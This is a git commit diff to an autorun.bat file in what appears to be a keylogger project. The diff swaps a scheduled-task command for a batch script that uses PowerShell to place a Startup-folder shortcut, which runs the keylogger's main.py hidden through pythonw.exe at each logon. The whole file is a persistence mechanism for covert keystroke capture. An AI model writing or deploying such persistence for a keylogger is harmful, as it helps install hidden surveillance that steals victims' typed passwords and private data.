2e27b4e37caf68b3787cb2e989bab5b7da8585a0
henrycsharp <151407721+Henrycsharp@users.noreply.github.com>
2025-03-09 21:03:27 +0100

    Update autorun.bat

--- autorun.bat
+++ autorun.bat
@@ -1,1 +1,10 @@
-schtasks /create /tn "MyPythonScript" /tr "pythonw.exe C:\Users\%USERNAME%\keylogger\main.py" /sc onlogon /f
+@echo off
+set username=%USERNAME%
+set python_path="C:\Path\to\pythonw.exe"
+set script_path="C:\Users\%username%\keylogger\main.py"
+set startup_folder="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MyPythonScript.lnk"
+
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%startup_folder%');$s.TargetPath='%python_path%';$s.Arguments='%script_path%';$s.Save()"
+
+echo Shortcut created successfully!
+pause
